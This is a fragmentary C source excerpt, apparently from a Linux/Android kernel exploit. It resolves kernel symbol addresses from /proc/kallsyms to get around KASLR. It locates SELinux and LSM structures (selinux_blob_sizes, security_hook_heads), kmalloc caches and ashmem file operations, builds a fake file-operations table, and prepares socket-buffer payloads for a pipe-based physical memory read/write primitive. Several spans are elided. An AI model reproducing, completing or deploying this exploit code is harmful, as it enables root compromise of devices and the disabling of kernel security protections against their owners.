...
/*
 * Runtime offset resolution for symbols that may be missing from target.h
 * (set to 0x0). Reads /proc/kallsyms at startup to fill in addresses.
 */

/* Runtime-resolved offsets (0 = use compile-time value from target.h) */
static uint64_t rt_anon_pipe_buf_ops = 0;
static uint64_t rt_kmalloc_caches = 0;
static uint64_t rt_selinux_blob_sizes = 0;
static uint64_t rt_security_hook_heads = 0;
static uint64_t rt_ashmem_misc_fops = 0;
static uint64_t rt_configfs_read_iter = 0;
...
static uint64_t resolve_kallsyms(const char *name) {
  ...
  char cmd[256];
  snprintf(cmd, sizeof(cmd), "grep -w '%s' /proc/kallsyms 2>/dev/null", name);
...
/* Resolve a kallsyms symbol to its runtime virtual address (already KASLR-slid) */
static uint64_t resolve_sym_addr(const char *name) {
  uint64_t addr = resolve_kallsyms(name);
  return addr;  /* Return raw address, 0 if not found */
}

void resolve_missing_offsets(void) {
  pr_info("Resolving missing kernel symbols from /proc/kallsyms...\n");

  /*
   * Runtime addresses from kallsyms are already KASLR-slid.
   * Store raw VAs. Callers must NOT apply text_addr/data_addr to these.
   */

  /* generic_pipe_buf_ops is a static struct, not in kallsyms.
   * But generic_pipe_buf_confirm is at offset 0 of the struct.
   * So struct_addr == confirm_addr. */
  if (ANON_PIPE_BUF_OPS_OFF == 0) {
    rt_anon_pipe_buf_ops = resolve_sym_addr("generic_pipe_buf_confirm");
    if (!rt_anon_pipe_buf_ops)
      rt_anon_pipe_buf_ops = resolve_sym_addr("anon_pipe_buf_ops");
    if (rt_anon_pipe_buf_ops)
      pr_info("  pipe_buf_ops: resolved 0x%lx\n", rt_anon_pipe_buf_ops);
    else
      pr_warning("  pipe_buf_ops: FAILED - pipe physrw will not work\n");
  }

  if (NOOP_LLSEEK_OFF == 0) {
    rt_noop_llseek = resolve_sym_addr("noop_llseek");
    if (rt_noop_llseek)
      pr_info("  noop_llseek: resolved 0x%lx\n", rt_noop_llseek);
  }

  if (COPY_SPLICE_READ_OFF == 0) {
    rt_copy_splice_read = resolve_sym_addr("copy_splice_read");
    if (rt_copy_splice_read)
      pr_info("  copy_splice_read: resolved 0x%lx\n", rt_copy_splice_read);
  }

  if (CONFIGFS_READ_ITER_OFF == 0) {
  ...
  if (KMALLOC_CACHES_OFF == 0) {
    rt_kmalloc_caches = resolve_sym_addr("kmalloc_caches");
    if (rt_kmalloc_caches)
      pr_info("  kmalloc_caches: resolved 0x%lx\n", rt_kmalloc_caches);
    else
      pr_warning("  kmalloc_caches: NOT in kallsyms - need vmlinux offset\n");
  }

  if (SELINUX_BLOB_SIZES_OFF == 0) {
    rt_selinux_blob_sizes = resolve_sym_addr("selinux_blob_sizes");
    if (rt_selinux_blob_sizes)
      pr_info("  selinux_blob_sizes: resolved 0x%lx\n", rt_selinux_blob_sizes);
    else
      pr_warning("  selinux_blob_sizes: NOT in kallsyms - need vmlinux offset\n");
  }

  if (SECURITY_HOOK_HEADS_OFF == 0) {
    rt_security_hook_heads = resolve_sym_addr("security_hook_heads");
    if (rt_security_hook_heads)
      pr_info("  security_hook_heads: resolved 0x%lx\n", rt_security_hook_heads);
    else
      pr_warning("  security_hook_heads: NOT in kallsyms - need vmlinux offset\n");
  }

  if (ASHMEM_MISC_FOPS_OFF == 0) {
    rt_ashmem_misc_fops = resolve_sym_addr("ashmem_misc_fops");
    if (rt_ashmem_misc_fops)
      pr_info("  ashmem_misc_fops: resolved 0x%lx\n", rt_ashmem_misc_fops);
    else
...
/*
 * Accessors return the address to use directly (already KASLR-slid if from kallsyms).
 * Callers must NOT wrap these in text_addr() or data_addr().
 */
uint64_t get_anon_pipe_buf_ops_addr(void) {
  if (rt_anon_pipe_buf_ops) return rt_anon_pipe_buf_ops;
  /* compile-time: apply data_addr for KASLR */
  return data_addr(KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF);
}
uint64_t get_noop_llseek_addr(void) {
  if (rt_noop_llseek) return rt_noop_llseek;
  return text_addr(KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF);
}
uint64_t get_copy_splice_read_addr(void) {
  if (rt_copy_splice_read) return rt_copy_splice_read;
  return text_addr(KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF);
}
...
uint64_t get_configfs_bin_write_iter_addr(void) {
  ...
  return text_addr(KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF);
}
uint64_t get_kmalloc_caches_addr(void) {
  if (rt_kmalloc_caches) return rt_kmalloc_caches;
  return data_addr(KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF);
}
uint64_t get_selinux_blob_sizes_addr(void) {
  if (rt_selinux_blob_sizes) return rt_selinux_blob_sizes;
  return data_addr(KIMAGE_TEXT_BASE + SELINUX_BLOB_SIZES_OFF);
}
uint64_t get_security_hook_heads_addr(void) {
  if (rt_security_hook_heads) return rt_security_hook_heads;
  return data_addr(KIMAGE_TEXT_BASE + SECURITY_HOOK_HEADS_OFF);
}
...
void put_fake_fops_table(unsigned char *p, size_t off) {
  ...
  put64(p, off + FOPS_COMPAT_IOCTL_OFF, text_addr(KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF));
  put64(p, off + FOPS_MMAP_OFF, text_addr(KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF));
  put64(p, off + FOPS_OPEN_OFF, text_addr(KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF));
  put64(p, off + FOPS_RELEASE_OFF, text_addr(KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF));
  put64(p, off + FOPS_SPLICE_READ_OFF, get_copy_splice_read_addr());
  put64(p, off + FOPS_SHOW_FDINFO_OFF, text_addr(KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF));
}
...
int prepare_skb_payload(uintptr_t base, int payload_mode) {
  ...
  if (payload_mode == PAGE_PAYLOAD_FOPS) {
    ...
    fake_right = get_ashmem_misc_fops_addr();
    fake_left = 0;
    binwrite_target = payload_base + SCRATCH_OFF;
  } else {
    fake_parent = get_ashmem_misc_fops_addr() - 8;
